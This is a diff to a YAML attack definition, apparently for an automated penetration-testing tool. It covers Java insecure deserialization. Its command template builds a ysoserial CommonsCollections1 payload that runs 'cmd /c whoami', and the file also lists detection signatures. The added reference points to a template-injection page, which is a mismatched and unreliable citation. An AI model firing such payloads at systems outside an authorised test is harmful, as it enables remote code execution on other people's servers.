@@ -2,15 +2,18 @@ name: insecure_deserialization_java
 category: web
 description: Java deserialization (ysoserial)
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "java -jar ysoserial.jar CommonsCollections1 'cmd /c whoami' | base64"
+command_template: java -jar ysoserial.jar CommonsCollections1 'cmd /c whoami' | base64
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Java ObjectInputStream.readObject() with gadget chains. Common frameworks: Apache Commons, Spring, WebLogic. Detect: rO0AB (base64) or ac ed 00 05 (hex) in cookies/params."
+mechanism: 'Java ObjectInputStream.readObject() with gadget chains. Common frameworks:
+  Apache Commons, Spring, WebLogic. Detect: rO0AB (base64) or ac ed 00 05 (hex) in
+  cookies/params.'
+hacktricks_ref: pentesting-web/ssti-server-side-template-injection/README.md
